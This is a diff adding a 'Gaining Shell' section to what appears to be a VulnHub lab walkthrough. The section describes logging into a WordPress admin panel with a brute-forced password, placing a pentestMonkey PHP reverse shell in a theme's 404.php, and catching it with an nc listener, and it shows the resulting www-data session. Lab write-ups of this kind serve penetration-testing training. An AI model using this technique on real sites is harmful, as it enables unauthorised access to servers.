@@ -112,6 +112,37 @@ wpscan --url http://192.168.127.252/1010101/wordpress/ -U user.txt -P /usr/share
 
 - found the password : Password@123 
 
+now we can login to admin panel
+
+## 3.Gaining Shell
+
+All we need to do is to edit page `404.php` of `twentytwelve` theme and put a pentestMonkey PHP reverse shell into it and start a listener :
+
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/dc1c9195-ac8d-4d9b-b09c-b5d8acd3872a)
+
+
+
+```bash
+root@kali: nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.127.128] from (UNKNOWN) [192.168.127.252] 38397
+Linux ubuntu 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:51:20 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+ 05:12:45 up 51 min,  0 users,  load average: 0.02, 0.25, 0.60
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+
+
+
+
+
+
+
 
 
 
